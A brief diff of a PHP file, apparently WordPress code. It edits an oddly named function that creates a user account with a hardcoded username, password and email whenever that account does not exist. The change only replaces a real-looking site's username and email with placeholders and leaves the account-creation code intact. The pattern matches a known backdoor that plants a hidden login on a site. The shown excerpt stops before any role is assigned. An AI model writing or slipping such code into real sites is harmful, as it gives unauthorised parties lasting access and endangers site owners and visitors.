@@ -1,8 +1,8 @@
 <?php
 function dsdfgrtrthfd() {
-    $username = 'galdesign';
+    $username = 'username';
     $password = 'StrongPassword123!';
-    $email = 'admin@galdesign.co.il';
+    $email = 'admin@example.com';
 
     if (!username_exists($username) && !email_exists($email)) {
         $user_id = wp_create_user($username, $password, $email);
